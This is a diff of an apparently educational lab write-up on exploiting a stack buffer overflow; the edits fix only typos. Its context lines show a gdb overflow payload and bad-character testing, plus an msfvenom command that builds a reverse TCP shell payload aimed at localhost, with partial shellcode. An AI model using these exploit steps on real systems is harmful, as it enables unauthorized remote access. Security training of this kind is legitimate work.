@@ -267,7 +267,7 @@ Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 1805 +
 
 Breakpoint 1, 0x56555691 in leavemsg ()
 ```
-Now we can examine the stack and identify the bad charcaters.
+Now we can examine the stack and identify the bad characters.
 ```nasm
 ...<SNIP>...
 0xffffd688:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
@@ -296,7 +296,7 @@ Buffer = "\x55" * (2064 - 254 - 4) = 1806
 ```nasm
 (gdb)run $(python -c "print '\x55' * 1806 + '\x01\x02\x03\x04\x05\x06\x07\x08\x0a\...<SNIP>...\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' + '\x66' * 4")
 ``` 
-Then we examine the stack
+Then we examine the stack.
 ```nasm
 (gdb)x/3000xb $esp
 ...<SNIP>...
@@ -341,7 +341,7 @@ If we sent char without `\x09` & `\x0a` & `\x20` and then examine the stack, we 
 Finally the bad characters are `\x00` (which is always a bad character) & `x09`  & `x0a` & `\x20`
 
 #### Generating our shellcode
-Now that we have idenfify the bad characters we can generate our shellcode.
+Now that we have idenfify the bad characters, we can generate our shellcode.
 ```nasm
 └─# msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=4444 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
 Found 11 compatible encoders
@@ -372,7 +372,7 @@ Shellcode = "\xda\xc3\xb8\x7d...<SNIP>...\x71\x8d\x46\x41\x0b\xb3\xd6\x6e\xc6\xb
 ```
 
 #### Identification of the Return Address
-we now have to choose an address to which we refer the `EIP` and which reads and executes one byte after the other starting at this address.
+We now have to choose an address to which we refer the `EIP` and which reads and executes one byte after the other starting at this address.
 ```nasm
 (gdb)x/3000xb $esp
 ...<SNIP>...
